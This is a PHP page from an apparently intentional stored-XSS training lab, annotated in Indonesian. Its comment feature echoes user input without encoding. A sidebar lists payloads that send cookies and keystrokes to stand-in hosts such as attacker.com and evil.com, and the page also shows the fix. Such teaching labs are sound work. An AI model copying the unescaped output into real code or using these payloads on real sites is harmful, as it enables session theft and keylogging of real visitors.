<?php
// Database configuration
$host = $_ENV['MYSQL_HOST'] ?? 'mysql';
$username = $_ENV['MYSQL_USER'] ?? 'xsslab';
$password = $_ENV['MYSQL_PASSWORD'] ?? 'password123';
$database = $_ENV['MYSQL_DATABASE'] ?? 'xss_lab';

try {
    $pdo = new PDO("mysql:host=$host;dbname=$database;charset=utf8", $username, $password);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch(PDOException $e) {
    die("Connection failed: " . $e->getMessage());
}

// Handle comment submission
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit_comment'])) {
    $name = $_POST['name'];
    $email = $_POST['email'];
    $comment = $_POST['comment'];
    
    // VULNERABLE CODE - Direct insert without sanitization
    $stmt = $pdo->prepare("INSERT INTO comments (name, email, comment) VALUES (?, ?, ?)");
    $stmt->execute([$name, $email, $comment]);
    
    $success_message = "Comment posted successfully!";
}

// Handle comment deletion
if (isset($_GET['delete'])) {
    $id = $_GET['delete'];
    $stmt = $pdo->prepare("DELETE FROM comments WHERE id = ?");
    $stmt->execute([$id]);
    header("Location: stored.php");
    exit;
}

// Fetch all comments
$stmt = $pdo->query("SELECT * FROM comments ORDER BY created_at DESC");
$comments = $stmt->fetchAll(PDO::FETCH_ASSOC);

session_start();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stored XSS - Vulnerable Lab</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        .vulnerability-badge { background-color: #dc3545; }
        .code-example { background-color: #f8f9fa; padding: 15px; border-left: 4px solid #dc3545; }
        .comment-card { border-left: 4px solid #007bff; }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <div class="container">
            <a class="navbar-brand" href="index.php">
                <span class="badge vulnerability-badge">VULNERABLE</span>
                XSS Lab
            </a>
            <div class="navbar-nav">
                <a class="nav-link" href="index.php">Home</a>
                <a class="nav-link" href="reflected.php">Reflected XSS</a>
                <a class="nav-link active" href="stored.php">Stored XSS</a>
                <a class="nav-link" href="dom.php">DOM XSS</a>
                <a class="nav-link" href="contexts.php">XSS Contexts</a>
            </div>
        </div>
    </nav>

    <div class="container mt-4">
        <h1>💾 Stored XSS Vulnerability</h1>
        <div class="alert alert-danger">
            <strong>Kerentanan:</strong> Data yang disimpan di database ditampilkan tanpa sanitasi, menyebabkan XSS persisten.
        </div>

        <?php if (isset($success_message)): ?>
        <div class="alert alert-success">
            <?php echo $success_message; ?>
        </div>
        <?php endif; ?>

        <div class="row">
            <div class="col-md-8">
                <div class="card">
                    <div class="card-header">
                        <h5>📝 Add Comment (Vulnerable Form)</h5>
                    </div>
                    <div class="card-body">
                        <form method="POST">
                            <div class="mb-3">
                                <label for="name" class="form-label">Name:</label>
                                <input type="text" class="form-control" id="name" name="name" required>
                            </div>
                            <div class="mb-3">
                                <label for="email" class="form-label">Email:</label>
                                <input type="email" class="form-control" id="email" name="email" required>
                            </div>
                            <div class="mb-3">
                                <label for="comment" class="form-label">Comment:</label>
                                <textarea class="form-control" id="comment" name="comment" rows="4" required 
                                         placeholder="Coba masukkan: <script>alert('Stored XSS!')</script>"></textarea>
                            </div>
                            <button type="submit" name="submit_comment" class="btn btn-primary">Post Comment</button>
                        </form>
                    </div>
                </div>

                <div class="card mt-4">
                    <div class="card-header">
                        <h5>💬 Comments (<?php echo count($comments); ?> total)</h5>
                    </div>
                    <div class="card-body">
                        <?php if (empty($comments)): ?>
                            <p class="text-muted">No comments yet. Be the first to comment!</p>
                        <?php else: ?>
                            <?php foreach ($comments as $comment): ?>
                                <div class="card comment-card mb-3">
                                    <div class="card-body">
                                        <div class="d-flex justify-content-between">
                                            <h6 class="card-title">
                                                <!-- VULNERABLE CODE - Direct output without sanitization -->
                                                <?php echo $comment['name']; ?>
                                                <small class="text-muted">(<?php echo $comment['email']; ?>)</small>
                                            </h6>
                                            <small class="text-muted">
                                                <?php echo date('Y-m-d H:i', strtotime($comment['created_at'])); ?>
                                                <a href="?delete=<?php echo $comment['id']; ?>" 
                                                   class="text-danger ms-2" 
                                                   onclick="return confirm('Delete this comment?')">Delete</a>
                                            </small>
                                        </div>
                                        <div class="card-text">
                                            <!-- VULNERABLE CODE - Direct output without sanitization -->
                                            <?php echo $comment['comment']; ?>
                                        </div>
                                    </div>
                                </div>
                            <?php endforeach; ?>
                        <?php endif; ?>
                    </div>
                </div>
            </div>

            <div class="col-md-4">
                <div class="card">
                    <div class="card-header">
                        <h5>💡 Stored XSS Payloads</h5>
                    </div>
                    <div class="card-body">
                        <h6>Basic Alert:</h6>
                        <div class="code-example">
                            <code>&lt;script&gt;alert('Stored XSS!')&lt;/script&gt;</code>
                        </div>

                        <h6 class="mt-3">Cookie Theft:</h6>
                        <div class="code-example">
                            <code>&lt;script&gt;
document.location='http://attacker.com/steal.php?cookie='+document.cookie;
&lt;/script&gt;</code>
                        </div>

                        <h6 class="mt-3">Session Hijacking:</h6>
                        <div class="code-example">
                            <code>&lt;script&gt;
new Image().src='http://evil.com/log.php?data='+document.cookie;
&lt;/script&gt;</code>
                        </div>

                        <h6 class="mt-3">Keylogger:</h6>
                        <div class="code-example">
                            <code>&lt;script&gt;
document.addEventListener('keypress', function(e) {
    new Image().src='http://evil.com/log.php?key='+e.key;
});
&lt;/script&gt;</code>
                        </div>

                        <h6 class="mt-3">Redirect:</h6>
                        <div class="code-example">
                            <code>&lt;script&gt;
window.location.href='http://malicious-site.com';
&lt;/script&gt;</code>
                        </div>

                        <h6 class="mt-3">Hidden Image:</h6>
                        <div class="code-example">
                            <code>&lt;img src=x onerror=alert('Stored XSS') style="display:none"&gt;</code>
                        </div>
                    </div>
                </div>

                <div class="card mt-3">
                    <div class="card-header">
                        <h5>🔍 Vulnerable Code</h5>
                    </div>
                    <div class="card-body">
                        <small>
                            <pre><code>// VULNERABLE PHP CODE:
// Insert without sanitization
$stmt->execute([$name, $email, $comment]);

// Display without encoding
echo $comment['name'];
echo $comment['comment'];</code></pre>
                        </small>
                    </div>
                </div>

                <div class="card mt-3">
                    <div class="card-header">
                        <h5>🛡️ How to Fix</h5>
                    </div>
                    <div class="card-body">
                        <small>
                            <pre><code>// SECURE PHP CODE:
// Sanitize input
$name = filter_var($name, 
    FILTER_SANITIZE_STRING);

// Encode output
echo htmlspecialchars($comment['name'], 
    ENT_QUOTES, 'UTF-8');

// Or use HTMLPurifier for HTML content</code></pre>
                        </small>
                    </div>
                </div>

                <div class="card mt-3">
                    <div class="card-header">
                        <h5>⚠️ Impact</h5>
                    </div>
                    <div class="card-body">
                        <ul class="small">
                            <li>Persisten - Menyerang setiap visitor</li>
                            <li>Cookie theft & session hijacking</li>
                            <li>Keylogger untuk mencuri data</li>
                            <li>Defacement website</li>
                            <li>Phishing attacks</li>
                            <li>Malware distribution</li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>

        <div class="alert alert-warning mt-4">
            <h5>📝 Learning Notes:</h5>
            <ul>
                <li><strong>Stored XSS</strong> adalah yang paling berbahaya karena bersifat persisten</li>
                <li>Script jahat disimpan di database dan dieksekusi setiap kali halaman dimuat</li>
                <li>Semua user yang mengakses halaman akan terpengaruh</li>
                <li>Sering ditemukan di: comment form, user profiles, forum posts, chat applications</li>
                <li>Pencegahan: Input validation + Output encoding + Content Security Policy</li>
            </ul>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>